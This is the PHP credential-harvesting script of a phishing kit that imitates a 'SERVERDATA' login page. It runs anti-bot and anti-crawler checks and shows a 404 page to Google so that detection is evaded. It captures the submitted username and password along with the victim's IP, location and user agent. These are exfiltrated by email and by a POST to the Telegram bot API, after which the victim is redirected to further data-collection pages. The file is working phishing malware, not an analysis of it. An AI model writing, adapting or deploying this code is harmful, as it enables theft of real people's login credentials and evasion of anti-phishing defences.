<?php
ob_start();

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

include('function.php');
include('../config.php');

require ("../antibots/AntiBotUserAgent.php");
require ("../antibots/AntiBotIsp.php"); 
require ("../antibots/AnitiBotHost.php");
require ("../antibots/AntiBotPhishTank.php");
require ("../antibots/AntiBotVpn.php");
require ("../antibots/SaveBrowsing.php");
require ("../antibots/DiscoveredBot.php");
require ("../antibots/AntiBotThree.php");
require ("../antibots/DisturbOne.php");
require ("../antibots/DisturbTwo.php");
require("../antibots/Anti/Bot-Crawler.php");
@require("../antibots/Anti/Crawler/src/CrawlerDetect.php");
use JayBizzle\CrawlerDetect\CrawlerDetect;
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { include("../404.php"); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { include("../404.php"); exit(); }

$useragent = $_SERVER['HTTP_USER_AGENT'];

$required = array('fldUsername', 'fldPassword');

$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
} 
 
if ($error) {
  header('Location: https://www.google.com/search?q=SERVERDATA+login');
} else {
# Logs

$msgtg = "🔐 <b>SERVERDATA LOGIN DETAILS</b> 🔐\n";
$msgtg .= "━━━━━━━━━━━━━━━\n\n";

$msgtg .= "👤 <b>LOGIN INFO</b>\n";
$msgtg .= "• Login ID: <code>" . htmlspecialchars($_POST['fldUsername']) . "</code>\n";
$msgtg .= "• Password: <code>" . htmlspecialchars($_POST['fldPassword']) . "</code>\n\n";

$msgtg .= "📍 <b>LOCATION INFO</b>\n";
$msgtg .= "• IP Address: <code>{$IP}</code>\n";
$msgtg .= "• Location: <code>http://www.geoiptool.com/?IP={$IP}</code>\n\n";

$msgtg .= "💻 <b>DEVICE INFO</b>\n";
$msgtg .= "• Browser: <code>{$os}</code>\n";
$msgtg .= "• User-Agent: <code>" . substr($useragent, 0, 100) . "...</code>\n\n";

$msgtg .= "━━━━━━━━━━━━━━━\n";
$msgtg .= "⏰ " . date("F j, Y g:i a") . "\n\n";
$msgtg .= " + Dev: <a href='https://t.me/DBack3nd_Godfather'>@DBack3nd_Godfather</a> +";

$email_msg = "
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 20px auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }
        .header { background: #002D72; color: white; padding: 15px; border-radius: 5px 5px 0 0; }
        .section { margin: 15px 0; padding: 15px; background: #f9f9f9; border-radius: 5px; }
        .footer { margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class='container'>
        <div class='header'>
            <h2>✦ SERVERDATA Login Details ✦</h2>
        </div>
        <div class='section'>
            <h3>🔥 Login Information</h3>
            <p>Login ID: <code>" . htmlspecialchars($_POST['fldUsername']) . "</code></p>
            <p>Password: <code>" . htmlspecialchars($_POST['fldPassword']) . "</code></p>
        </div>
        <div class='section'>
            <h3>📱 Device Information</h3>
            <p>IP Address: {$IP}</p>
            <p>GeoLocation: <a href='http://www.geoiptool.com/?IP={$IP}'>View Location</a></p>
            <p>Date: {$date}</p>
            <p>User Agent: {$_SERVER['HTTP_USER_AGENT']}</p>
            <p>OS/Browser: {$os}</p>
        </div>
    </div>
</body>
</html>";

if ($settings['send_mail'] == "1"){
    $to = $settings['email'];
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: SERVERDATA <SERVERDATA@client_site.com>\r\n";
    $subject = "✦ SERVERDATA Login - {$IP} ✦";
    mail($to, $subject, $email_msg, $headers);
}

if ($settings['telegram'] == "1"){
    $send = [
        'chat_id' => $settings['chat_id'],
        'text' => $msgtg,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $website = "https://api.telegram.org/bot{$settings['bot_url']}";
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

if ($settings['double_login'] == "1") {
    header('Location: ../error.php?id=' . bin2hex(random_bytes(32)));
} else {
    header('Location: ../info.php?id=' . bin2hex(random_bytes(32)));
}
}
?>